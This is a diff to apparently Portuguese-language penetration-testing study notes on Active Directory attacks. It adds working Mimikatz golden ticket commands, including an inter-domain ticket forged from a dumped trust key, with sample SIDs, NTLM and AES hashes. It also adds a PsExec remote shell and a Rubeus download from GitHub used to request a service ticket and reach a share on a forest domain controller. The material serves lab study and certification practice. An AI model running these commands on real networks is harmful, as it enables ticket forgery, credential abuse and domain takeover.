@@ -3036,7 +3036,13 @@ setspn -L eurocorp-dc.eurocorp.local
 setspn -T medin -Q */*
 setspn -L eurocorp.local\eurocorp-dc
 ```
-
+##### GOLDEN TICKET PAPUM
+```
+kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd366 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
+```
+```
+.\PsExec.exe -accepteula \\dcorp-dc cmd
+```
 
 
 
@@ -3235,8 +3241,34 @@ Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /domain:dollarcorp.moneycorp.local /all /csv"'
 ```
-	
-NA MINHA MAQUINA:
+EXEMPLO:
+```
+RID  : 0000047d (1149)
+User : EUROCORP$
+NTLM : cd43222cb60dcd0186feb9cd39a55a98
+```
+```
+Current domain: TECH.LOCAL (TECH / S-1-5-21-4215187987-3124207031-433979976)
+Domain: EUROCORP.LOCAL (EUROCORP / S-1-5-21-2535815940-1189005199-3504936255)
+ [  In ] TECH.LOCAL -> EUROCORP.LOCAL
+* aes256_hmac       99423e041906bd071ede9fc7f42738e4088411bed4234c959d65559a6c17d409
+* aes128_hmac       dff352c60e253b33534b23bb7d91e2ab
+* rc4_hmac_nt       cd43222cb60dcd0186feb9cd39a55a98
+```
+NA MINHA MÁQUINA, GERAR O GOLDEN TICKET(INTER DOMAIN):
+```
+Kerberos::golden /user:Administrator /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976  /rc4:cd43222cb60dcd0186feb9cd39a55a98 /service:krbtgt /target:eurocorp.local /ticket:C:\trust_forest_tkt.kirbi
+```
+SOLICITAR O TGS USANDO O RUBEUS:
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -outfile Rubeus.exe
+.\Rubeus.exe asktgs /ticket:C:\trust_forest_tkt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
+```
+TENTAR ACESSAR O COMPARTILHAMENTO:
+```
+dir \\eurocorp-dc.eurocorp.local\test\
+```
+NA MINHA MAQUINA (OLD):
 ```
 Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:2312dc4f4fdd49029d2945ee1b2b3c2c /service:krbtgt /target:eurocorp.local /ticket:C:\trust_forest_tkt.kirbi"'
 .\asktgs.exe C:\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
